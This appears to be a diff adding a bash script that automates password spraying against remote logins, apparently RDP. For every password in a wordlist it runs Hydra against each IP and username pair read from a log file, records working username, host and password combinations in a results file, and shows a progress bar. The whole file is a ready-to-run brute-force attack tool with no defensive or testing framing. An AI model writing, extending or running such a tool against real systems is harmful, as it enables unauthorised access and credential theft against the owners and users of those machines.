@@ -1,0 +1,170 @@
+#!/bin/bash
+
+# Define the input files
+iplog_file="iplog.txt"
+passwords_file="passwords.txt"
+success_log_file="successful_logins.txt"
+
+# Check if the input files exist
+if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
+    echo "One or both files do not exist, exiting."
+    exit 1
+fi
+
+# Create or clear the success log file
+> "$success_log_file"
+
+# Read all IP:username pairs into an array
+mapfile -t iplog_entries < "$iplog_file"
+# Read all passwords into an array
+mapfile -t passwords < "$passwords_file"
+
+# Get the total number of attempts
+total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
+current_attempt=0
+successful_attempts=0
+start_time=$(date +%s)
+
+# Create a temporary file to store remaining passwords
+temp_passwords_file=$(mktemp)
+
+# Function to display progress with progress bar and time left graph
+display_progress() {
+    local elapsed_time=$1
+    local current_attempt=$2
+    local total_attempts=$3
+    local successful_attempts=$4
+
+    local progress_bar_length=50
+    local treats_per_minute=0
+    local estimated_time_left=0
+    local percent=0
+
+    # Avoid division by zero for the rate and estimated time
+    if (( current_attempt > 0 && elapsed_time > 0 )); then
+        treats_per_minute=$((current_attempt * 60 / elapsed_time))
+        percent=$(( (current_attempt * 100) / total_attempts ))
+        estimated_time_left=$(( (elapsed_time * total_attempts / current_attempt) - elapsed_time ))
+    else
+        treats_per_minute=0
+        percent=0
+        estimated_time_left=0
+    fi
+
+    # Build the progress bar
+    local completed_bar_length=$(( percent * progress_bar_length / 100 ))
+    local progress_bar=""
+
+    for ((i=0; i<completed_bar_length; i++)); do
+        progress_bar="${progress_bar}#"
+    done
+    for ((i=completed_bar_length; i<progress_bar_length; i++)); do
+        progress_bar="${progress_bar}-"
+    done
+
+    # Time left graph (using 20 dots)
+    local time_graph_length=20
+    local completed_time_graph_length=0
+    if (( elapsed_time > 0 && (elapsed_time + estimated_time_left) > 0 )); then
+        completed_time_graph_length=$(( (elapsed_time * time_graph_length) / (elapsed_time + estimated_time_left) ))
+    fi
+    local time_graph=""
+
+    for ((i=0; i<completed_time_graph_length; i++)); do
+        time_graph="${time_graph}."
+    done
+    for ((i=completed_time_graph_length; i<time_graph_length; i++)); do
+        time_graph="${time_graph} "
+    done
+
+    # Clear the screen (only part of it, keeping the last few lines)
+    tput cup 0 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Progress: $current_attempt / $total_attempts ($percent%)"
+
+    tput cup 1 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Progress Bar: [$progress_bar]"
+
+    tput cup 2 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Time left graph: [$time_graph]"
+
+    tput cup 3 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Attempts per minute: $treats_per_minute"
+
+    tput cup 4 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Successful logins: $successful_attempts"
+
+    tput cup 5 0
+    echo -ne "\033[2K"  # Clear the current line
+    echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
+}
+
+# Print initial static UI
+tput clear  # Clear the entire screen
+echo "Total Attempts: $total_attempts"
+echo "----------------------------------------"
+echo "Attempting logins..."
+
+# Loop through each password
+for password in "${passwords[@]}"; do
+    # Ensure the password is not empty
+    if [[ -z "$password" ]]; then
+        continue
+    fi
+    
+    # Loop through each RDP entry in iplog.txt for the current password
+    for entry in "${iplog_entries[@]}"; do
+        IFS=: read -r full_url target_name <<< "$entry"
+        
+        # Check if the full_url and target_name are not empty
+        if [[ -z "$full_url" || -z "$target_name" ]]; then
+            continue
+        fi
+
+        # Run Hydra for each username and password pair, capturing output
+        if sudo hydra -l "$target_name" -p "$password" "$full_url" -t 5 -W 4 | grep -q "login successful"; then
+            echo "Successful login with $target_name on $full_url using password: $password" >> "$success_log_file"
+            successful_attempts=$((successful_attempts + 1))
+        fi
+
+        # Update current attempt count
+        current_attempt=$((current_attempt + 1))
+        
+        # Update elapsed time
+        elapsed_time=$(( $(date +%s) - start_time ))
+        
+        # Display progress
+        display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts"
+    done
+
+    # Write the password to the temp file (it's been checked)
+    echo "$password" >> "$temp_passwords_file"
+
+    # Remove checked passwords from the original file as we go
+    grep -vFf "$temp_passwords_file" "$passwords_file" > "${passwords_file}.new"
+    mv "${passwords_file}.new" "$passwords_file"
+done
+
+# Clean up the temporary file
+rm "$temp_passwords_file"
+
+# Final calculations
+elapsed_time=$(( $(date +%s) - start_time ))
+if (( current_attempt > 0 )); then
+    estimated_time_left=$(( (elapsed_time * total_attempts / current_attempt) - elapsed_time ))
+else
+    estimated_time_left=0
+fi
+
+# Final output
+echo -ne "\n----------------------------------------\n"
+echo "Completed processing all entries in $iplog_file."
+echo "Total Attempts: $total_attempts"
+echo "Successful Logins: $(wc -l < $success_log_file)"
+echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
+echo "Estimated Time Left: $(printf '%02d:%02d:%02d' $((estimated_time_left/3600)) $(( (estimated_time_left%3600)/60 )) $((estimated_time_left%60)))"
+echo "Checked passwords have been deleted from $passwords_file."
